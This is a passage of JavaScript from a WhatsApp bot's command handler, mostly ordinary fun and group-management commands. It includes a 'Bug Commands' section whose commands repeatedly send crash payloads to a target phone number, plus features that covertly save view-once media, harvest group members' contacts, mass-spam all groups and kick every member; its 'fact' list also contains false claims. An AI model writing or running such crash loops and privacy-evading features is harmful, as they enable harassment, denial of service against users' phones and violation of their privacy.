    // Ensure the command is a reply to an image or targets a user's profile picture
    if (!/image/.test(mime) && !mentionedJid.length) {
        return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .blur to apply a blur effect*`);
    }

    try {
        let imageUrl;

        // If it's a reply to an image, download and upload it
        if (/image/.test(mime)) {
            const mediaPath = await David.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return reply(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } else if (mentionedJid.length) {
            // If a user is mentioned, fetch their profile picture
            const userJid = mentionedJid[0];
            imageUrl = await David.profilePictureUrl(userJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } else {
            return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .blur to apply a blur effect*`);
        }

        // Call the Blur API
        const apiResponse = await axios.get(`https://api.popcat.xyz/blur`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const blurredImageUrl = apiResponse.request.res.responseUrl; // The URL of the blurred image

            // Send the blurred image back to the user
            await David.sendMessage(m.chat, {
                image: { url: blurredImageUrl },
                caption: `*Blurred Image Generated Successfully!*`
            }, { quoted: m });
        } else {
            reply(`*BLUR EFFECT ERROR!! MESSAGE :*\n\n> Failed to apply a blur effect. Try again.`);
        }
    } catch (error) {
        console.error('Error in Blur command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}


   
case 'drake': {
    if (!text || !text.includes('|')) {
        return reply(`*Usage:* .drakememe <text1>|<text2>\n\n*Example:* .drakememe amongus|amogus`);
    }

    try {
        // Split the input into two parts
        const [text1, text2] = text.split('|').map(t => t.trim());

        if (!text1 || !text2) {
            return reply(`*Usage:* .drakememe <text1>|<text2>\n\n*Example:* .drakememe amongus|amogus`);
        }

        // Call the Popcat API to generate the meme
        const apiResponse = await axios.get(`https://api.popcat.xyz/drake`, {
            params: { text1, text2 }
        });

        if (apiResponse.status === 200) {
            const memeUrl = apiResponse.request.res.responseUrl; // The URL of the generated meme

            // Send the generated meme back to the user
            await David.sendMessage(m.chat, {
                image: { url: memeUrl },
                caption: `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`
            }, { quoted: m });
        } else {
            reply(`*MEME GENERATION ERROR!! MESSAGE :*\n\n> Failed to generate a Drake meme. Try again.`);
        }
    } catch (error) {
        console.error('Error in Drake Meme command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }

    break;
}



  case 'ship': {
    try {
        // Ensure the command is used in a group
        if (!isGroup) return reply('This command can only be used in groups.');

        // Get the list of group members
        const groupMembers = groupMetadata.participants.map(member => member.id);
        if (groupMembers.length < 2) return reply('Not enough members to use the ship command.');

        // Select two random members
        const [user1, user2] = groupMembers.sort(() => Math.random() - 0.5).slice(0, 2);

        // Fetch profile pictures for the two users
        const profilePic1 = await David.profilePictureUrl(user1, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        const profilePic2 = await David.profilePictureUrl(user2, 'image').catch(() => 'https://cdn.popcat.xyz/popcat.png');

        // Call the Popcat API to generate the ship image
        const apiResponse = await axios.get(`https://api.popcat.xyz/ship`, {
            params: { user1: profilePic1, user2: profilePic2 }
        });

        if (apiResponse.status === 200) {
            const shipImageUrl = apiResponse.request.res.responseUrl; // The URL of the generated ship image

            // Send the ship image with a caption tagging the two members
            await David.sendMessage(from, {
                image: { url: shipImageUrl },
                caption: `❤️ @${user1.split('@')[0]} *LOVES* @${user2.split('@')[0]} ❤️\n*[ 😍 Latest Couples 🥺 ]*`,
                mentions: [user1, user2], // Proper tagging for both users
            }, { quoted: m });
        } else {
            reply(`*SHIP GENERATION ERROR!! MESSAGE :*\n\n> Failed to ship. Try again.`);
        }
    } catch (error) {
        console.error('Error in Ship command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

 
case 'git': case 'gitclone':
if (!args[0]) return reply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DeeCeeXxx/Queen_Anita-V3`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxeon(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    David.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(`error`))
break

        case 'bcgc': case 'bcgroup': {
if (!isCreator) return reply('Owner only')
await loading()
if (!text) return reply(`Text?\n\nExample : ${prefix + command} Update QUEEN_ANITA-V3 !`)
let getGroups = await David.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Send Broadcast To ${anu.length} Group Chat.`)
for (let i of anu) {
await sleep(1500)
David.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
reply(`Successfully Sending Broadcast To ${anu.length} Group`)
}
break
   case 'jpm':{
if (!isCreator) return reply("?")
if (!text) return reply(`*Input Format*\n${prefix+command} text|pause\nReply photo to jpm Give a pause, 1000 = 1 second\n\nExample: ${prefix + command} single siamang keris|4000`)
let getGroups = await David.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await David.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await David.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)
await David.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await David.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break 


/// Bug Commands

case 'benkai':
    if (!isCreator) return reply('For My Owner Only');
    try {
        if (!q) return reply(`Example: ${prefix + command} 234×××`);
        
        const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

        // Validate the target number against restricted targets
        if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
            return reply('This number is restricted from being attacked.');
        }

        // Perform the bug actions
        reply(bugres);
        for (let i = 0; i < 70; i++) {
            await buk1(David, target, "p", 1020000, ptcp = true);
            await sendQP(target, wanted);
            await beta2(David, target, wanted);
            await sendSessionStructure(target, wanted);
            await beta1(David, target, wanted);
        }

        reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    } catch (error) {
        console.error("An error occurred:", error);
        await David.sendMessage(m.chat, { text: '❗ An error occurred. Please try again later.' });
    }
    break;
    
 case 'zenitsu': case 'venom': case 'q-anita':
if (!q) return reply(`Example: ${prefix + command} 234×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(David, target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(David, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(David, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break
   
    
 
 
case 'play': {
    if (!text) return reply(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        // React to the command with a musical note emoji
        await David.sendMessage(m.chat, { react: { text: `🎵`, key: m.key } });

        // Search for the song on YouTube
        const yts = require("yt-search");
        let search = await yts(text);
        let video = search.all[0]; // Take the top result

        // Build the preview message
        let body = `*QUEEN_ANITA-V4_MUSIC - PLAYER*\n` +
                   `> Title: *${video.title}*\n` +
                   `> Views: *${video.views}*\n` +
                   `> Duration: *${video.timestamp}*\n` +
                   `> Uploaded: *${video.ago}*\n` +
                   `> Url: *${video.url}*`;

        // Send the image and caption as a preview
        await David.sendMessage(m.chat, {
            image: { url: video.thumbnail },
            caption: body
        }, { quoted: m });

        // Fetch audio details using the new API
        const apiResponse = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3`, {
            params: { url: video.url }
        });

        // Check if the API response is successful
        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data; // Extract title and download link

            // Send the audio file
            await David.sendMessage(m.chat, {
                audio: { url: dl },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here's your song:*\n> *Title:* ${title}`
            }, { quoted: m });
        } else {
            reply(`*Error fetching the song!*`);
        }
    } catch (error) {
        console.error('Error during play command:', error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}




case 'couple': {
if (!quoted) return reply( `Example : ${prefix + command} David|Anita`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
let teks = `
• *Your name :* ${anu.message.nama_anda}
• *Couple Name :* ${anu.message.nama_pasangan}
• *Positive Side :* ${anu.message.sisi_positif}
• *Negative Side :* ${anu.message.sisi_negatif}`
reply(teks)
}
break   


case 'vv': case 'readviewonce': {
if (!m?.quoted) return reply('reply the image/video you want to see')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message..')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return David.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case 'vv2': case 'readviewonce2': {
if (!isCreator) return reply(`For My Owner Only Stupid`) 
    if (!m?.quoted) return reply('Reply to the image/video you want to view.');
    if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('This is not a view-once message.');

    let msg = m?.quoted.message;
    let type = Object.keys(msg)[0];
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    
    let media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
    let buffer = Buffer.from([]);
    
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk]);
    }

    // Get the ID of the user who executed the command
    let userWhatsAppID = m?.sender;

    if (/video/.test(type)) {
        return David.sendFile(userWhatsAppID, buffer, 'media.mp4', msg[type].caption || '', m);
    } else if (/image/.test(type)) {
        return David.sendFile(userWhatsAppID, buffer, 'media.1jpg', msg[type].caption || '', m);
    }
}
break;




        case 'savecontact': case 'svcontact': {
    if (!m.isGroup) return reply(`For Groups Only`);
    if (!(isBotAdmins || isCreator)) return reply(`For Admin Only`);
    
    let cmiggc = await David.groupMetadata(m.chat);  // Get group metadata
    let participants = cmiggc.participants;        // Get group participants
    let vcard = '';
    let contactCount = 0;
    let fileIndex = 1; // Track the file part number
    const maxContactsPerFile = 100; // Limit contacts per file
    
    for (let a of participants) {
        // Fetch the WhatsApp name (pushname), fallback to the number if not available
        let contactName = (await David.getName(a.id)) || a.id.split("@")[0];
        let number = a.id.split("@")[0];
        
        // Format the vCard entry with the contact's name and number
        vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${contactName}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        contactCount++;
        
        // If we reach the max contacts per file, save and send the current file
        if (contactCount >= maxContactsPerFile) {
            let nmfilect = `./contacts_part${fileIndex}.vcf`;
            require('fs').writeFileSync(nmfilect, vcard.trim());
            
            await David.sendMessage(m.chat, {
                document: require('fs').readFileSync(nmfilect),
                mimetype: 'text/vcard',
                fileName: `Contacts_Part${fileIndex}.vcf`,
                caption: `Group: *${cmiggc.subject}*\nContacts: *${contactCount}*`
            }, {ephemeralExpiration: 86400, quoted: m});
            
            require('fs').unlinkSync(nmfilect);  // Delete the file after sending
            vcard = '';                          // Reset vCard content for the next file
            contactCount = 0;                    // Reset counter
            fileIndex++;                         // Increment file index
        }
        
        // Delay to avoid overloading the server
        await sleep(300);
    }
    
    // Save and send any remaining contacts in the final file
    if (contactCount > 0) {
        let nmfilect = `./contacts_part${fileIndex}.vcf`;
        require('fs').writeFileSync(nmfilect, vcard.trim());
        
        await David.sendMessage(m.chat, {
            document: require('fs').readFileSync(nmfilect),
            mimetype: 'text/vcard',
            fileName: `Contacts_Part${fileIndex}.vcf`,
            caption: `Group: *${cmiggc.subject}*\nContacts: *${contactCount}*`
        }, {ephemeralExpiration: 86400, quoted: m});
        
        require('fs').unlinkSync(nmfilect);  // Delete the file after sending
    }
}
break;


case 'horoscope': {
    if (!text) return reply('Please provide a zodiac sign. Example: .horoscope aries');

    const [zodiacSign, period = 'daily'] = text.toLowerCase().split(' ');

    // Ensure the zodiac sign is valid
    const validSigns = ['aries', 'taurus', 'gemini', 'cancer', 'leo', 'virgo', 'libra', 'scorpio', 'sagittarius', 'capricorn', 'aquarius', 'pisces'];
    if (!validSigns.includes(zodiacSign)) {
        return reply('Invalid zodiac sign. Please choose a valid zodiac sign. Example: .horoscope aries');
    }

    // Ensure the period is valid
    const validPeriods = ['daily', 'weekly', 'monthly', 'yearly'];
    if (!validPeriods.includes(period)) {
        return reply('Invalid period. Please choose one: daily, weekly, monthly, or yearly.');
    }

    try {
        // Fetch the horoscope data
        const response = await axios.get(`https://horoscope-app-api.vercel.app/api/v1/get-horoscope/${period}?sign=${zodiacSign}&day=TODAY`);
        const horoscope = response.data;

        if (horoscope.status === 200) {
            // Send the horoscope message
            await David.sendMessage(m.chat, {
                text: `*Horoscope for ${zodiacSign.charAt(0).toUpperCase() + zodiacSign.slice(1)} (${period.charAt(0).toUpperCase() + period.slice(1)})*\n\n${horoscope.data.horoscope_data}`
            }, { quoted: m });
        } else {
            reply('Could not fetch the horoscope data. Please try again later.');
        }
    } catch (error) {
        console.error(error);
        reply('Failed to fetch the horoscope. Please try again later.');
    }
    break;
}

        
        
        case 'antiviewonce': {
    if (!isCreator) return reply(`*For My Owner Only!*`);
    if (!args[0]) return reply(`*Usage:* ${prefix + command} on/off\n\n*Example:* ${prefix + command} on`);
    
    if (args[0].toLowerCase() === 'on') {
        global.ANTIVIEWONCE = true;
        reply('*Successfully Activated ANTIVIEWONCE.*');
    } else if (args[0].toLowerCase() === 'off') {
        global.ANTIVIEWONCE = false;
        reply('*Successfully Deactivated ANTIVIEWONCE.*');
    } else {
        reply(`*Invalid Option!*\n\n*Usage:* ${prefix + command} on/off`);
    }
    break;
}
   


			
case 'chatbot': {
if (!isCreator) return (`For My Owner Only`) 
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.chatbot = true
await reply('SucessFully Activated Chatbot.')
} else if (args[0] === 'off') {
global.chatbot = false
await reply('SucessFully Deactivated ChatBot.')
}}
break                     


case 'welcome': {
    if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
    if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.welcome = true
await reply('SucessFully Activated Welcome Message.')
} else if (args[0] === 'off') {
global.welcome = false
await reply('SucessFully Deactivated Welcome Message.')
}}
break   			

case 'flux':
  if (!text) return reply('Give me a Prompt !!')
  try {
    await loading()
    let pix = await (await fetch('https://endpoint.web.id/ai/flux-schnell?key=gojou&prompt=' + text)).json()
    let shannz = pix.result[0]
    David.sendMessage(m.chat, { image: { url: shannz }, caption: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™' }, { quoted: m })
} catch (e) {
    reply('*there is an error*')
}
break


case 'mode-private': {
if (!isCreator) return m.reply(mess.OnlyOwner)
global.public = false
m.reply('Sucessfully Changed To Private Mode')
}
break

case 'mode-public': {
if (!isCreator) return m.reply(mess.OnlyOwner)
global.public = true
m.reply('Sucessfully Changed To Public Mode')
}
break



case 'wcg': {
    if (wcgSession.active) {
        return reply("❌ A WCG game is already active. Wait for it to finish before starting another.");
    }

    // Initialize a new WCG session
    wcgSession = {
        active: true,
        players: [],
        currentTurn: 0,
        wordLength: 3, // Start with 3-letter words
        timer: 60000,  // Start with 60 seconds
    };
    saveWCGSession(wcgSession);

    reply(`🎮 *Word Chain Game Starting in 5 Minutes!* 🎮\nType *join* to participate!`);

    // Allow players to join for 5 minutes
    setTimeout(() => {
        wcgSession = loadWCGSession(); // Reload the session to get the latest state

        if (wcgSession.players.length < 3) { // Ensure player count is updated
            wcgSession.active = false;
            saveWCGSession(wcgSession);
            return reply("❌ Not enough players joined. WCG game canceled. (Minimum 3 players required)");
        }

        reply(`🎮 *Word Chain Game Starting Now!*\n\nPlayers:\n${wcgSession.players.map((player) => `@${player.split("@")[0]}`).join("\n")}`, {
            mentions: wcgSession.players,
        });

        wcgNextTurn(); // Start the game
    }, 300000); // 5 minutes
    break;
}

case 'join': {
    if (!wcgSession.active) {
        return reply("❌ No WCG game is active. Use *wcg* to start a game.");
    }

    const user = m.sender;

    // Check if the user already joined
    if (wcgSession.players.includes(user)) {
        return reply(`❌ @${user.split("@")[0]}, you have already joined the WCG game!`, {
            mentions: [user],
        });
    }

    // Add the user to the players list
    wcgSession.players.push(user);
    saveWCGSession(wcgSession); // Save session immediately after any changes

    reply(`✅ @${user.split("@")[0]} joined the WCG game! (${wcgSession.players.length} players so far)`, { mentions: [user] });
    break;
}






case 'promoteall':
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isBotAdmins) return reply('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return reply('Only group admins can use this command.');

    for (let participant of participants) {
        if (!groupAdmins.includes(participant.id)) {
            try {
                await David.groupParticipantsUpdate(from, [participant.id], 'promote');
                await delay(500); // Add a 1-second delay between each request
            } catch (err) {
                console.log(`Error promoting ${participant.id}:`, err.message);
            }
        }
    }
    reply('Successfully promoted all members to admin.');
    break;

    
    
    case 'demoteall':
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isBotAdmins) return reply('Bot must be an admin to use this command.');
    if (!isGroupOwner && !isAdmins) return reply('Only group admins can use this command.');

    for (let admin of groupAdmins) {
        if (admin !== botNumber) {
            try {
                await David.groupParticipantsUpdate(from, [admin], 'demote');
                await delay(500); // Add a 1-second delay between each request
            } catch (err) {
                console.log(`Error demoting ${admin}:`, err.message);
            }
        }
    }
    reply('Successfully demoted all admins to members.');
    break;

    
     case 'tweet': {
    if (!text || !text.includes('|')) {
        return reply(`*Usage:* .tweet <name>|<username>|<tweet>\n\n*Example:* .tweet John Doe|jhon|Hello World`);
    }

    try {
        // Parse input into name, username, and tweet text
        const [name, username, tweetText] = text.split('|').map(t => t.trim());

        if (!name || !username || !tweetText) {
            return reply(`*Usage:* .tweet <name>|<username>|<tweet>\n\n*Example:* .tweet John Doe|jhon|Hello World`);
        }

        // Generate the API URL with query parameters
        const tweetImageUrl = `https://api.siputzx.my.id/api/m/tweet?name=${encodeURIComponent(name)}&username=${encodeURIComponent(username)}&tweet=${encodeURIComponent(tweetText)}`;

        // Send the generated tweet image
        await David.sendMessage(m.chat, {
            image: { url: tweetImageUrl },
            caption: `\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`,
        }, { quoted: m });
    } catch (error) {
        console.error('Error in Tweet command:', error);
        reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}


    
    case 'kickall':
    if (!m.isGroup) return reply('This command can only be used in groups.');
    if (!isBotAdmins) return reply('Bot must be an admin to use this command.');
    if (!isGroupOwner) return reply('Only group owners can use this command.');

    for (let participant of participants) {
        if (participant.id !== botNumber && participant.id !== groupOwner) {
            await David.groupParticipantsUpdate(from, [participant.id], 'remove');
        }
    }
    reply('Successfully removed all group members.');
    break;
    
    


case 'ghstalk': case 'githubstalk':{
reply('`Wait...`')
if (!q) return reply(`Example ${prefix+command} DeeCeeXxx`)
reply('`Processing...`') 
aj = await githubstalk.githubstalk(`${q}`)
David.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break





case 'tiktokstalk':
case 'ttstalk': {
    if (!args[0]) return reply('Please provide a TikTok username!');

    const username = args[0];

    try {

        const response = await axios.get(`https://bk9.fun/stalk/tiktok?q=${username}`);

        // Check if the request was successful
        if (response.data.status === true) {
            const profile = response.data.BK9;

            // Format and send profile information with a thumbnail (profile picture)
            await David.sendMessage(m?.chat, {
                image: { url: profile.profile },
                caption: `*[ TIKTOK PROFILE INFO ]*\n
- *🔖Name:* ${profile.name}
- *🔖Username:*: ${profile.username}
- *👥Follower:*: ${profile.followers}
- *🫂Following:* ${profile.following}
- *Likes:* ${profile.likes}
-  *📌Bio:* ${profile.bio || 'No bio available'}
- *🏝️Description:*: ${profile.desc || 'No description available\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ'}`
            });

        } else {
            reply('Could not retrieve the profile. Please make sure the username is correct!');
        }
    } catch (error) {
        console.error(error);
        reply('There was an error fetching the TikTok profile information.');
    }
    break;
}



case 'autoviewstatus': {
    if (!isCreator) return m.reply('For My Owner Only');
    if (!args[0]) return m.reply(`Example: ${prefix + command} on/off`);
    
    if (args[0] === 'on') {
        global.autoViewStatus = true;  // Activate auto-view status
        await reply('Successfully Activated Auto-View Status.');
    } else if (args[0] === 'off') {
        global.autoViewStatus = false;  // Deactivate auto-view status
        await reply('Successfully Deactivated Auto-View Status.');
    } else {
        m.reply(`Invalid option. Use: ${prefix + command} on/off`);
    }
}
break;

case 'save': {
    if (!isCreator) return Owner();
    try {
        let mediaType;
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('Reply to a Video, Image, or Audio Status');
        }

        var mediaFile = await David.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        await David.sendMessage(m.sender, messageOptions, { quoted: m });
        await reply('`Done`');
    } catch (error) {
        console.error(error);
        reply('Failed to save and send the media.');
    }
    break;
}

case 'update':
    if (!isCreator) return reply('You do not have permission to use this command.');
    
    await checkForUpdates();

    break;
 

case 'tutor':
case 'tutorial': {
await David.sendMessage(m?.chat, {react: {text: `📚`,key: m?.key,}}) 
 reply(`👋🏻 Hii ${pushname}, 
\n\n*All Tutorials Are Here*  \n\nhttps://www.youtube.com/@DavidCyril_TECH \n\nPlease Dont Forget To Subscribe`)
}
break 


case 'countdown':
    let timess = parseInt(args[0]);
    if (isNaN(time)) return reply("Please provide a valid time in seconds.");
    
    const countdownInterval = setInterval(() => {
        timess--;
        reply(`Time left: ${timess} seconds`);
        if (time === 0) {
            clearInterval(countdownInterval);
            reply("Countdown finished!");
        }
    }, 1000);
    break;

case 'faketyping':
    const typingDuration = parseInt(args[0]) || 5; // duration in seconds
    await David.sendPresenceUpdate('composing', m.chat);
    setTimeout(() => {
        reply("Got you! 😂");
        David.sendPresenceUpdate('paused', m.chat);
    }, typingDuration * 10000);
    break;
    

    
case 'joke':
    const jokes = [
        "Why don't scientists trust atoms? Because they make up everything!",
        "What do you call fake spaghetti? An impasta!",
        // Add more jokes
    ];
    reply(jokes[Math.floor(Math.random() * jokes.length)]);
    break;
    
    
case 'antilink-kick': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilinkkick = true
await reply('SucessFully Activated Antilink-kick')
} else if (args[0] === 'off') {
global.antilinkkick = false
await reply('SucessFully Deactivated Antilink-kick.')
}}
break                     

   
case 'antilink-warn': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilinkwarn = true
await reply('SucessFully Activated Antilink-warn to warn link senders')
} else if (args[0] === 'off') {
global.antilinkwarn = false
await reply('SucessFully Deactivated Antilink-warn.')
}}
break                  


case 'antilink-delete': {
  if (!m.isGroup) return reply('ɢʀᴏᴜᴘ ᴏɴʟʏ');
    if (!isBotAdmins) return reply('ʙᴏᴛ ɴᴏᴛ ʏᴇᴛ ᴀᴅᴍɪɴ');
    if (!isAdmins) return reply('ғᴏʀ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴ ᴏɴʟʏ');
if (!args[0]) return m.reply(`Example: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antilink = true
await reply('SucessFully Activated Antilink to warn link senders')
} else if (args[0] === 'off') {
global.antilink = false
await reply('SucessFully Deactivated Antilink.')
}}
break                      
    

case 'fact':
await David.sendMessage(m?.chat, {react: {text: `🔥`,key: m?.key,}})
    const facts = [
        "Honey never spoils.",
        "A day on Venus is longer than a year on Venus.",
        "Identical twins don’t have the same fingerprints.", 
        "Earth’s rotation is changing speed.", 
        "The largest piece of fossilised dinosaur poo discovered is over 30cm long and over two litres in volume.", 
        "Animals can experience time differently from humans.", 
        "Water might not be wet.", 
        "A chicken once lived for 18 months without a head.",
        "All the world’s bacteria stacked on top of each other would stretch for 10 billion light-years", 
        "Wearing a tie can reduce blood flow to the brain by 7.5 per cent", 
        "Our solar system has a wall.", 
         "Mount Everest isn't the tallest mountain on Earth.", 
         "Our solar system has a wall.", 
         "Octopuses don’t actually have tentacles.", 
         "Most maps of the world are wrong.", 
         "NASA genuinely faked part of the Moon landing", 
         "Comets smell like rotten eggs.", 
         "Earth’s poles are moving.", 
         "You can actually die laughing", 
         "Chainsaws were first invented for childbirth", 
         "Ants don’t have lungs.", 
         "Wind turbines kill between 10,000 and 100,000 birds each year in the UK.", 
         "Snails have teeth.", 
         "Your signature could reveal personality traits.", 
         "Your signature could reveal personality traits", 
         "Bananas are radioactive", 
         "There’s no such thing as a straight line", 
         "Deaf people are known to use sign language in their sleep", 
         "Finland is the happiest country on Earth", 
         "The Moon looks upside down in the Southern Hemisphere", 
         "Bacteria on your skin cause your itches", 
         "Starfish don’t have bodies", 
         "Somebody has been constipated for 45 days",
         "You travel 2.5 million km a day around the Sun without realising.", 
         "Fish form orderly queues in emergencies.", 
         "There are more bacterial cells in your body than human cells", 
         "The world record for donut eating is held by John Haight, who ate 29 donuts (52 ounces) in a little over six minutes", 
         "The world record for donut eating is held by John Haight, who ate 29 donuts (52 ounces) in a little over six minutes",
         "Corn Flakes were invented after Will Keith Kellogg and his brother Dr. John Harvey Kellogg set about developing a nutritious cereal for the patients of a health resort in 1890", 
         "Every square inch of the human body has about 19,000,000 skin cells",
         "The trunk of an elephant can hold up to two gallons of water"
        // Add more facts
    ];
    reply(facts[Math.floor(Math.random() * facts.length)]);
    break;
    

    
 case 'meme':
    const memeUrl = "https://meme-api.com/gimme";

    try {
        const memeRes = await axios.get(memeUrl);
        const memeImg = memeRes.data.url;
        const memeTitle = memeRes.data.title;
        await David.sendMessage(m.chat, { image: { url: memeImg }, caption: memeTitle });
    } catch (error) {
        reply("Failed to fetch a meme.");
    }
    break;
    
    
    
   

	


case 'channel': {
await David.sendMessage(m?.chat, {react: {text: `💝`,key: m?.key,}}) 
 reply(`*FOLLOW OUR OFFICIAL CHANNEL*\n\nhttps://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L`)
} 
break 


case 'script': case 'sc': case 'repo': {
